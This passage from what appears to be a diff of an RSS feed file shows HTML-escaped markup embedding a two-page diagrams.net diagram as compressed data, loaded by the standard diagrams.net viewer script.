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&amp;lt;/diagram&amp;gt;&amp;lt;/mxfile&amp;gt;&amp;quot;}&#34;&gt;&lt;/div&gt;
+&lt;body&gt;&lt;div class=&#34;mxgraph&#34; style=&#34;max-width:100%;border:1px solid transparent;&#34; data-mxgraph=&#34;{&amp;quot;highlight&amp;quot;:&amp;quot;#0000ff&amp;quot;,&amp;quot;nav&amp;quot;:true,&amp;quot;resize&amp;quot;:true,&amp;quot;page&amp;quot;:0,&amp;quot;toolbar&amp;quot;:&amp;quot;pages zoom layers tags lightbox&amp;quot;,&amp;quot;edit&amp;quot;:&amp;quot;_blank&amp;quot;,&amp;quot;xml&amp;quot;:&amp;quot;&amp;lt;mxfile host=\&amp;quot;app.diagrams.net\&amp;quot; modified=\&amp;quot;2022-04-20T06:46:08.668Z\&amp;quot; agent=\&amp;quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&amp;quot; etag=\&amp;quot;4pQ9NjlFAk0gBzxx88za\&amp;quot; version=\&amp;quot;17.4.5\&amp;quot; pages=\&amp;quot;2\&amp;quot;&amp;gt;&amp;lt;diagram id=\&amp;quot;9m9pWsRvkve3vRoIh5zU\&amp;quot; name=\&amp;quot;Page-1\&amp;quot;&amp;gt;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&amp;lt;/diagram&amp;gt;&amp;lt;diagram id=\&amp;quot;Yspwrotni0tyzMKoO_N9\&amp;quot; name=\&amp;quot;Page-2\&amp;quot;&amp;gt;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&amp;lt;/diagram&amp;gt;&amp;lt;/mxfile&amp;gt;&amp;quot;}&#34;&gt;&lt;/div&gt;
 &lt;script type=&#34;text/javascript&#34; src=&#34;https://viewer.diagrams.net/js/viewer-static.min.js&#34;&gt;&lt;/script&gt;
 &lt;/body&gt;
-&lt;/html&gt;
-</description>
+&lt;/html&gt;</description>
         </item>
         
     </channel>
